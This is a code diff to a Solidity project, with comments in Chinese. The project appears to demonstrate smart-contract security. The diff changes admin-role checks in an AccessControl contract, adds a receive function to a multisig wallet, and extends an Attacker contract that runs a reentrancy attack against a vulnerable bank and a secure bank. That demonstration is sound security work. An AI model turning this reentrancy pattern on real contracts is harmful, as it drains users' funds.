@@ -92,6 +92,8 @@ contract AccessControl {
     );
 
     constructor() {
+        // 设置 ADMIN_ROLE 为自己的管理员
+        _roles[ADMIN_ROLE].adminRole = ADMIN_ROLE;
         _grantRole(ADMIN_ROLE, msg.sender);
     }
 
@@ -106,7 +108,12 @@ contract AccessControl {
      * @dev 授予角色
      */
     function grantRole(bytes32 _role, address _account) public {
-        require(hasRole(_roles[_role].adminRole, msg.sender), "AccessControl: sender must be admin");
+        // 如果该角色还没有设置 adminRole，允许 ADMIN_ROLE 授予
+        bytes32 adminRoleToCheck = _roles[_role].adminRole;
+        if (adminRoleToCheck == bytes32(0)) {
+            adminRoleToCheck = ADMIN_ROLE;
+        }
+        require(hasRole(adminRoleToCheck, msg.sender), "AccessControl: sender must be admin");
         _grantRole(_role, _account);
     }
 
@@ -114,7 +121,12 @@ contract AccessControl {
      * @dev 撤销角色
      */
     function revokeRole(bytes32 _role, address _account) public {
-        require(hasRole(_roles[_role].adminRole, msg.sender), "AccessControl: sender must be admin");
+        // 如果该角色还没有设置 adminRole，允许 ADMIN_ROLE 撤销
+        bytes32 adminRoleToCheck = _roles[_role].adminRole;
+        if (adminRoleToCheck == bytes32(0)) {
+            adminRoleToCheck = ADMIN_ROLE;
+        }
+        require(hasRole(adminRoleToCheck, msg.sender), "AccessControl: sender must be admin");
         _revokeRole(_role, _account);
     }
 
@@ -127,6 +139,11 @@ contract AccessControl {
     }
 
     function _grantRole(bytes32 _role, address _account) private {
+        // 如果这是第一次授予该角色，设置 ADMIN_ROLE 为管理员
+        // (除非角色本身就是 ADMIN_ROLE，它管理自己)
+        if (_roles[_role].adminRole == bytes32(0)) {
+            _roles[_role].adminRole = ADMIN_ROLE;
+        }
         _roles[_role].members[_account] = true;
         emit RoleGranted(_role, _account, msg.sender);
     }
@@ -294,6 +311,8 @@ contract Attacker {
     SecureBank public secureBank;
     VulnerableBank public vulnerableBank;
     uint256 public attackCount;
+    uint256 private attackAmount;
+    bool private attackingSecure;
 
     event AttackSuccess(uint256 amount);
 
@@ -306,19 +325,27 @@ contract Attacker {
         attackCount++;
 
         if (attackCount < 3) {
-            // 尝试重入攻击
-            vulnerableBank.vulnerableWithdraw(msg.value);
+            // 尝试重入攻击（根据当前目标选择银行）
+            if (attackingSecure) {
+                secureBank.withdraw(attackAmount);
+            } else {
+                vulnerableBank.vulnerableWithdraw(attackAmount);
+            }
         }
 
         emit AttackSuccess(msg.value);
     }
 
-    function attack(uint256 _amount) external {
+    function attack(uint256 _amount) external payable {
+        attackAmount = _amount;
+        attackingSecure = false;
         vulnerableBank.deposit{value: _amount}();
         vulnerableBank.vulnerableWithdraw(_amount);
     }
 
-    function attackSecure(uint256 _amount) external {
+    function attackSecure(uint256 _amount) external payable {
+        attackAmount = _amount;
+        attackingSecure = true;
         secureBank.deposit{value: _amount}();
         secureBank.withdraw(_amount);
     }
@@ -653,4 +680,9 @@ contract MultiSigWallet is Ownable {
     }
 
     mapping(address => bool) public isOwner;
+
+    /**
+     * @dev 接收 ETH 的回退函数
+     */
+    receive() external payable {}
 }
